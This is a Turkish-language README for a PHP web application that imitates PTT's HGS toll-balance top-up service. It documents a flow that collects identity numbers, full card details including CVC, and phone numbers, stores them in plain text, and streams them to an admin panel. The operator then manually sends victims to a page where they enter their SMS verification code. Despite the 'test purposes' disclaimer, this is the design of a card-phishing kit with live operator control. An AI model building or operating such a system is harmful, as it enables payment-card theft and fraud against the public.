# HGS Bakiye Yükleme Sistemi

Bu proje, PTT HGS bakiye yükleme işlemlerini yönetmek için geliştirilmiş bir web uygulamasıdır.

## Özellikler

- Session tabanlı kullanıcı takibi
- Çoklu kimlik doğrulama türleri (TC, Plaka, Vergi No, Pasaport, HGS)
- Adım adım ödeme süreci
- Veritabanı entegrasyonu
- Her adımda kullanıcı bilgilerinin güncellenmesi

## Kurulum

### 1. Veritabanı Kurulumu

```bash
# MySQL'e giriş yapın
mysql -u root -p

# database.sql dosyasını çalıştırın
source database.sql
```

Veya phpMyAdmin üzerinden `database.sql` dosyasını import edin.

### 2. Veritabanı Bağlantı Ayarları

`application-moderate.php` dosyasındaki veritabanı bağlantı bilgilerini düzenleyin:

```php
$host = 'localhost';
$dbname = 'hgs_system';
$username = 'root';
$password = '';
```

### 3. Dosyaları Web Sunucusuna Yükleyin

Tüm dosyaları XAMPP, WAMP veya benzeri bir web sunucusunun `htdocs` klasörüne kopyalayın.

## Kullanım Akışı

### 1. index.php - Kimlik Sorgulama
- Kullanıcı TC, Plaka, Vergi No, Pasaport veya HGS numarasını girer
- Session oluşturulur (userIdentifier)
- Veritabanında kullanıcı kaydı oluşturulur/güncellenir
- Kimlik türü ve değeri kaydedilir

### 2. screen2.php - Miktar Seçimi
- Kullanıcı yüklemek istediği miktarı seçer
- Hizmet bedeli otomatik hesaplanır
- Miktar bilgileri veritabanına kaydedilir

### 3. screen3.php - Ödeme Bilgileri
- Kullanıcı kart bilgilerini girer
- Kart numarası Luhn algoritması ile doğrulanır
- Tüm ödeme bilgileri veritabanına kaydedilir
- payment_status 'pending' olarak güncellenir

### 4. bekle.php - İşlem Bekleme
- Ödeme durumu 'pending' olarak bekler
- Her 2 saniyede bir veritabanını kontrol eder
- Admin redirect_url gönderdiğinde otomatik yönlendirilir

### 5. Admin Panel (admin.php)
- Kullanıcı: admin
- Şifre: admin123
- Tüm kullanıcıları anlık olarak görüntüleme
- Bekleyen ödemelere 3D Redirect URL gönderme
- Otomatik 5 saniyede bir yenileme
- Detaylı kullanıcı bilgilerini görüntüleme

### 6. 3dredirect.php - 3D Secure Sayfası
- Admin tarafından gönderilen URL'e yönlendirilir
- Kullanıcı SMS doğrulama kodu girer
- process_3d.php'ye form gönderilir

### 7. process_3d.php - 3D İşlem Tamamlama
- Doğrulama kodunu kontrol eder
- payment_status 'completed' olarak günceller
- success.php'ye yönlendirir

### 8. success.php - Başarı Sayfası
- İşlem detaylarını gösterir
- Session temizlenir

## Veritabanı Yapısı

### users Tablosu

| Alan | Tip | Açıklama |
|------|-----|----------|
| id | INT | Otomatik artan birincil anahtar |
| user_identifier | VARCHAR(255) | Benzersiz session ID |
| identifier_type | VARCHAR(50) | Kimlik türü (plaka, tc, vergi, pasaport, hgs) |
| identifier_value | VARCHAR(255) | Girilen kimlik değeri |
| amount | DECIMAL(10,2) | Yükleme miktarı |
| service_fee | DECIMAL(10,2) | Hizmet bedeli |
| total | DECIMAL(10,2) | Toplam tutar |
| card_holder | VARCHAR(255) | Kart sahibi adı |
| card_number | VARCHAR(255) | Kart numarası |
| card_expiry | VARCHAR(10) | Son kullanma tarihi |
| card_cvc | VARCHAR(10) | CVC kodu |
| phone | VARCHAR(20) | Telefon numarası |
| payment_status | VARCHAR(50) | Ödeme durumu (pending, completed, failed) |
| redirect_url | TEXT | 3D Secure yönlendirme URL'i |
| created_at | DATETIME | Oluşturulma tarihi |
| updated_at | DATETIME | Güncellenme tarihi |

## API Endpoints (application-moderate.php)

### create_user
Yeni kullanıcı oluşturur veya mevcut kullanıcıyı günceller.

**POST Parametreleri:**
- action: 'create_user'
- identifier_type: Kimlik türü
- identifier_value: Kimlik değeri

### update_amount
Kullanıcının miktar bilgilerini günceller.

**POST Parametreleri:**
- action: 'update_amount'
- amount: Yükleme miktarı
- service_fee: Hizmet bedeli
- total: Toplam tutar

### update_payment
Kullanıcının ödeme bilgilerini günceller ve ödeme durumunu 'pending' yapar.

**POST Parametreleri:**
- action: 'update_payment'
- card_holder: Kart sahibi
- card_number: Kart numarası
- card_expiry: Son kullanma tarihi
- card_cvc: CVC kodu
- phone: Telefon numarası

### check_status
Kullanıcının ödeme durumunu ve redirect URL'ini kontrol eder.

**POST Parametreleri:**
- action: 'check_status'

## Admin Panel

### Giriş Bilgileri
- URL: `admin.php`
- Şifre: `admin123`

### Özellikler
- Anlık kullanıcı takibi
- Otomatik 5 saniyede bir yenileme
- Bekleyen ödemelere 3D Redirect URL gönderme
- Detaylı kullanıcı bilgilerini görüntüleme
- İstatistikler (Toplam kullanıcı, bekleyen ödemeler, tamamlanan, toplam tutar)

### Admin API (admin_actions.php)

#### send_redirect
Kullanıcıya 3D Secure redirect URL'i gönderir.

**POST Parametreleri:**
- action: 'send_redirect'
- user_id: Kullanıcı ID
- redirect_url: Yönlendirilecek URL

#### get_details
Kullanıcının detaylı bilgilerini getirir.

**GET Parametreleri:**
- action: 'get_details'
- user_id: Kullanıcı ID

#### update_status
Kullanıcının ödeme durumunu günceller.

**POST Parametreleri:**
- action: 'update_status'
- user_id: Kullanıcı ID
- status: Yeni durum (pending, completed, failed)

## Güvenlik Notları

⚠️ **ÖNEMLİ:** Bu sistem test amaçlıdır. Gerçek bir üretim ortamında kullanmadan önce:

1. Kart bilgilerini asla düz metin olarak saklamayın
2. SSL/TLS sertifikası kullanın (HTTPS)
3. Kart bilgilerini şifreleyin
4. PCI DSS standartlarına uyun
5. Gerçek ödeme işlemleri için bir ödeme gateway'i entegre edin
6. SQL injection koruması ekleyin (PDO prepared statements kullanılıyor ama ek kontroller eklenebilir)
7. XSS koruması ekleyin
8. CSRF token'ları kullanın
9. Rate limiting ekleyin
10. Loglama sistemi ekleyin

## Gelecek Geliştirmeler

- [ ] Gerçek ödeme gateway entegrasyonu
- [ ] E-posta bildirimleri
- [ ] SMS doğrulama
- [ ] Admin paneli
- [ ] Ödeme geçmişi
- [ ] Fatura oluşturma
- [ ] Kart bilgilerinin şifrelenmesi
- [ ] 3D Secure entegrasyonu

## Lisans

Bu proje test amaçlı geliştirilmiştir.
